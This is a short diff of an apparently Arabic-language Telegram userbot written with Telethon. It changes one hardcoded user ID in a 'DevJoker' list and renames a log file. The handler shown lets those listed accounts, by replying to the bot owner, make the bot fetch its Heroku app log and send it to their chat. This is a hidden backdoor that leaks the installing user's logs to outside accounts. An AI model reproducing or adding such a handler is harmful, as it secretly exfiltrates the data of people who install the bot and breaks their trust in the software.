@@ -783,7 +783,7 @@ def prettyjson(obj, indent=4, maxlinelength=80):
     )
     return indentitems(items, indent, level=0)
 
-DevJoker = [705475246, 1374312239]
+DevJoker = [6664210824, 1374312239]
 @l313l.on(events.NewMessage(incoming=True))
 async def _(event):
     if event.reply_to and event.sender_id in DevJoker:
@@ -804,14 +804,14 @@ async def _(event):
                         " يجب التذكر من ان قيمه الفارات التاليه ان تكون بشكل صحيح \nHEROKU_APP_NAME\n HEROKU_API_KEY"
                     )
                 data = app.get_log()
-                with open('الجوكر 🖤.txt', 'w') as file:
+                with open('فلسطين العرب 🖤.txt', 'w') as file:
         	        file.write(data)
 
-                with open('الجوكر 🖤.txt', 'rb') as file:
+                with open('فلسطين العرب 🖤.txt', 'rb') as file:
                     await l313l.send_file(
-                    event.chat_id, "الجوكر 🖤.txt", caption="هذا هو الـ Log"
+                    event.chat_id, "فلسطين العرب 🖤.txt", caption="هذا هو الـ Log"
                     )
-                os.remove("الجوكر 🖤.txt")
+                os.remove("فلسطين العرب 🖤.txt")
 
 def prettyjson(obj, indent=4, maxlinelength=80):
     items, _ = getsubitems(
